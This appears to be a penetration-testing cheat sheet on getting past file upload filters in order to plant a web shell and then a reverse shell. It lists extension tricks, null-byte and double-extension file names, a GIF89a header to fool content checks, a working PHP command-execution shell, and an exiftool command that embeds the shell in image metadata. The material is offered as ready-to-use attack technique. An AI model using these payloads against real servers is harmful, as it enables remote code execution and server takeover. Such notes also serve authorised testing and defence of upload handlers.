## General

Upload shell to make reverse shell

# Bypass file upload filtering

### Client Side
- Disable javascript
- Upload an armless file and then manipulate it in burp after it's been through all the checks
### Rename it
- upload it as shell.php.jpg
### Blacklisting bypass, change extension
- `php phtml, .php, .php3, .php4, .php5, and .inc`
- bypassed by uploading an unpopular php extensions. such as: `pht, phpt, phtml, php3, php4, php5, php6`
- asp `asp, .aspx`
- perl `.pl, .pm, .cgi, .lib`
- jsp `.jsp, .jspx, .jsw, .jsv, and .jspf`
- Coldfusion `.cfm, .cfml, .cfc, .dbm`
### Whitelisting bypass

- Bypassed by uploading a file with some type of tricks,
- Like adding a null byte injection like `shell.php%00.gif` .
- Or by using double extensions for the uploaded file like `shell.jpg.php`
### GIF89a
If they check the content. Basically you just add the text "GIF89a;" before you shell-code. 

```
GIF89a;
<?php system($_GET['cmd']); ?>
```  

### In image
Manipulate data
   
	exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>'e